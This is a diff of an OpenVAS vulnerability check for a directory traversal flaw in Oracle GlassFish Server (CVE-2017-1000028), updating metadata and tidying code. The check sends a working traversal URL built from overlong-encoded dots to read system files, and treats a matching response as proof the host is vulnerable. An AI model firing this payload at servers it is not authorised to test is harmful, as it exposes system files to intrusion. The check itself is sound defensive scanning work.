@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_oracle_glass_fish_dir_trav_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
+# $Id: gb_oracle_glass_fish_dir_trav_vuln.nasl 9927 2018-05-23 04:13:59Z ckuersteiner $
 #
 # Oracle Glass Fish Server Directory Traversal Vulnerability
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:oracle:glassfish_server";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.806848");
-  script_version("$Revision: 7577 $");
+  script_version("$Revision: 9927 $");
   script_cve_id("CVE-2017-1000028");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-05-23 06:13:59 +0200 (Wed, 23 May 2018) $");
   script_tag(name:"creation_date", value:"2016-01-27 14:43:03 +0530 (Wed, 27 Jan 2016)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Oracle Glass Fish Server Directory Traversal Vulnerability");
@@ -55,9 +55,9 @@ if(description)
   script_tag(name:"affected", value:"Oracle Glassfish Server version 4.1.1
   and probably prior.");
 
-  script_tag(name:"solution" , value:"No solution or patch was made available for at least one year since disclosure of this vulnerability.
-   Likely none will be provided anymore.
-   General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"solution" , value:"No known solution was made available for at least one year since the
+disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
+a newer release, disable respective features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
 
@@ -77,30 +77,23 @@ include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
-# Variable Initialization
-url = "";
-http_port = "";
-
-## Get HTTP Port
-if(!http_port = get_app_port(cpe:CPE)){
+if (!http_port = get_app_port(cpe:CPE)){
  exit(0);
 }
 
-## iterate over list
 files = traversal_files();
 
 foreach file (keys(files))
 {
-  ##Construct Attack Request
   url = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae'+
         '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%'+
         'c0%ae%c0%ae/'+ files[file];
 
-  ## Try attack and check the response to confirm vulnerability
-  if(http_vuln_check(port:http_port, url:url, pattern:file))
-  {
+  if (http_vuln_check(port:http_port, url:url, pattern:file, check_header: TRUE)) {
     report = report_vuln_url( port:http_port, url:url );
     security_message(port:http_port, data:report);
     exit(0);
   }
 }
+
+exit(99);
